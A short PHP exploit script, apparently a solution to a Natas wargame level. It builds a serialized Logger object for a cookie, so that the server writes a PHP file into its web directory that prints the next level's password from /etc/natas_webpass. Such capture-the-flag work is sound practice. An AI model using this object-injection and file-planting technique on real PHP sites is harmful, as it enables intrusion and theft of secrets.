<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        //fopen FAILED. Permission denied!
        //$this->logFile = "/tmp/natas26_nbbfn2k9hjgehvt4bjm92h8f43.log"; //random-appearing string is the PHPSESSID cookie
        
        // fopen FAILED. Permission denied!
        //$this->logFile = "/var/www/natas/natas26/index.php"; //retrieved when submitting a request with empty parameters

        $this->logFile = "/var/www/natas/natas26/img/foobar.php";
        $this->initMsg = "Ignored";
        $this->exitMsg = '<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>'; 
        /* $this->exitMsg = '<?php echo "Hello Vain World "; exit(0); ?>'; */
    }
}

//The cookie value is assummed to be a serialized array after de-obfuscation
$obj = array();
$obj[0] = new Logger();

echo "serialized: " . serialize($obj) . "\n\n";
echo "base64'd  : " . base64_encode(serialize($obj)) . "\n\n";
echo "URL encded: " . urlencode(base64_encode(serialize($obj))) . "\n\n";

$cookie_value = urlencode(base64_encode(serialize($obj)));
echo "drawing=" . $cookie_value . "\n";
